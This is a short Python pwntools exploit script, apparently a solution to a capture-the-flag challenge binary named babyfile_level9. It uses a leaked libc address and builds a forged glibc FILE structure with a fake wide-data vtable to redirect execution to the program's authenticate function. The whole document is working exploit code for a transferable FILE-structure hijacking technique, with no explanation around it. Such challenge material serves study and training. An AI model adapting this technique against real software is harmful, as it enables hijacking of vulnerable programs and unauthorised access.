from pwn import *

context.arch = 'amd64'

p = process("/challenge/babyfile_level9")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
binary = ELF("/challenge/babyfile_level9")

_wide_vtable_offset = 0xe0
doallocbuf_call_offset = 0x68

# libc leak
p.recvuntil(b"[LEAK]")
p.recvuntil(b": ")
puts_libc_leak = int(p.recvuntil(b'\n')[:-1], 16)
print(hex(puts_libc_leak))
libc_base = puts_libc_leak - libc.sym.puts
libc.address = libc_base

fs = FileStructure()
fs.vtable = libc.sym['_IO_wfile_jumps'] + 24 - 0x38 # fwrite calling vtable + 0x38
fs._lock = libc.sym['_IO_2_1_stdout_'] + 4416 # lock for stdout 
fs._wide_data = libc.sym['_IO_2_1_stdout_'] # wide_data vtable will be right below the FILE_plus struct

# fake wide_data vtable
# point to the memory right below itself
_wide_data_vtable_loc = fs._wide_data + _wide_vtable_offset + 0x8
_wide_vtable = b"a" * doallocbuf_call_offset + p64(binary.sym['authenticate'])

# overwrite the file struct
payload = bytes(fs) + p64(_wide_data_vtable_loc) + _wide_vtable
p.send(payload)

p.interactive()
